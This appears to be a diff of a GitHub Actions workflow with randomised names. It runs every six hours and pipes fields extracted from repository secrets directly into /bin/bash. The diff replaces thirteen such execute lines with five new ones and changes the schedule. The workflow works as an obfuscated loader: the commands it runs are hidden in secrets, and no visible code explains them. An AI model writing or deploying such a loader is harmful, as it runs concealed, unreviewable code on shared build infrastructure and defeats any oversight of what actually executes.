@@ -3,28 +3,19 @@ name: changweiwu3891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 5/6 * * *'
+    - cron: '7 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: changweiwu3891
         env:
-          hcnyc760: ${{ secrets.hcnyc760 }}
+          zrwpp24007: ${{ secrets.zrwpp24007 }}
         run: |
-          echo $hcnyc760 | jq -r .xvby0 | /bin/bash
-          echo $svm9250 | jq -r .anjty0 | /bin/bash
-          echo $qiytg094 | jq -r .bcpzd22242 | /bin/bash
-          echo $mr69 | jq -r .i80343 | /bin/bash
-          echo $g208 | jq -r .sp02413 | /bin/bash
-          echo $veowp912 | jq -r .jn4081 | /bin/bash
-          echo $dpk2063 | jq -r .n7 | /bin/bash
-          echo $pjbl96315 | jq -r .vuo58132 | /bin/bash
-          echo $nfwzp07 | jq -r .cljhr1 | /bin/bash
-          echo $j83909 | jq -r .moor73 | /bin/bash
-          echo $xns74470 | jq -r .crsuo090 | /bin/bash
-          echo $kli0560 | jq -r .cr641 | /bin/bash
-          echo $j6451 | jq -r .e19 | /bin/bash
+          echo $zrwpp24007 | jq -r .gt07 | /bin/bash
+          echo $ofabx688 | jq -r .glz80292 | /bin/bash
+          echo $pf01608 | jq -r .fipcs00508 | /bin/bash
+          echo $cwy16447 | jq -r .rviqm012 | /bin/bash
+          echo $yrj6 | jq -r .euyny8 | /bin/bash
 
